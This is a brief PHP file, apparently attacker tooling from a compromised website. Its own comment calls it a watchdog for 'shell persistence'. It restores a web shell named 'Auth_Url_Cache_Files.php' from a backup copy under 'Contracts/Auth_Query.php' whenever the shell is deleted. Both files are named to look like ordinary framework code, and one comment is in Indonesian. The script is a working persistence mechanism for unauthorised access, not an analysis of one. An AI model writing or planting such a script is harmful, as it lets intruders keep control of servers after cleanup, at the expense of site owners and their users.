<?php
// Simple watchdog script for shell persistence
$shell = "Auth_Url_Cache_Files.php";
$backup = "Contracts/Auth_Query.php";

// Jika shell utama tidak ada, restore dari backup
if (!file_exists($shell)) {
    if (file_exists($backup)) {
        copy($backup, $shell);
        touch($shell);
    }
}
?>
